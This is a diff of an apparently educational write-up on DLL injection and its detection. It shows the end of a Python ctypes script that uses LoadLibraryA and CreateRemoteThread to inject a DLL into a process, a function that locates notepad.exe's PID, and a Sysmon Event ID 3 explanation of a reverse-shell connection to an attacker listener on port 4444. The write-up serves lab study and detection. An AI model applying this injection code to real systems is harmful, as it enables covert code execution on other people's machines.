@@ -61,17 +61,19 @@ load_library = kernel32.GetProcAddress(h_kernel32, b'LoadLibraryA')
 
 # Create remote thread in target process
 kernel32.CreateRemoteThread(h_process, None, 0, load_library, arg_address, 0, None)
+---
 
 
 The PID of the process changes everytime that a new process is run so was necessary we insert this 
 function to find the PID of the notepad automatically:
-
+---
 def get_notepad_pid():
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == 'notepad.exe':
           return proc.info['pid']
    return None
 pid = get_notepad_pid()
+---
 
 
 
@@ -202,7 +204,7 @@ RuleName Usermode
 **Explanation**: One of the most critical Sysmon logs for detection, Event ID 3 tracks outbound network connections. 
 This log confirms the reverse shell behavior, as `final.exe` attempts to connect to the attacker's listener on port 4444, commonly used by tools like Metasploit.
 
----
+
 
 ## Conclusion
 
